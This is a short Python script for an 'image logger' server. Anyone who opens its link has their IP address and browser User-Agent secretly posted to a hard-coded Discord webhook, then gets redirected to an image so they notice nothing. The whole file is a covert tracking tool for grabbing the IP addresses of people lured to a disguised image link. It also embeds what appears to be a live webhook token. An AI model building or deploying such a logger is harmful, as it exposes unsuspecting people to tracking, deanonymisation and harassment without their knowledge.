from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

# Configuration
WEBHOOK_URL =
"https://discord.com/api/webhooks/1335979504371499049/aftM-GJrac25vzJZDnwXsJ40OOvJUNfOous5qplstXtAIPCWm1zibfAKQv_PRa4sz43B"
IMAGE_URL = "https://your-server.com/image.jpg"  # Your hosted image

class ImageLogger(BaseHTTPRequestHandler):
    def log_ip(self):
        ip = self.client_address[0]  # Get IP address
        user_agent = self.headers.get('User-Agent', 'Unknown')

        # Send data to Discord webhook
        requests.post(WEBHOOK_URL, json={
            "username": "Image Logger",
            "embeds": [{
                "title": "Image Viewed",
                "description": f"**IP:** `{ip}`\n**User-Agent:** `{user_agent}`",
                "color": 16711680,
                "image": {"url": IMAGE_URL}
            }]
        })

    def do_GET(self):
        self.log_ip()
        self.send_response(302)
        self.send_header('Location', IMAGE_URL)
        self.end_headers()

# Start server
PORT = 8080  # Change as needed
server = HTTPServer(("0.0.0.0", PORT), ImageLogger)
print(f"Server running on port {PORT}...")
server.serve_forever()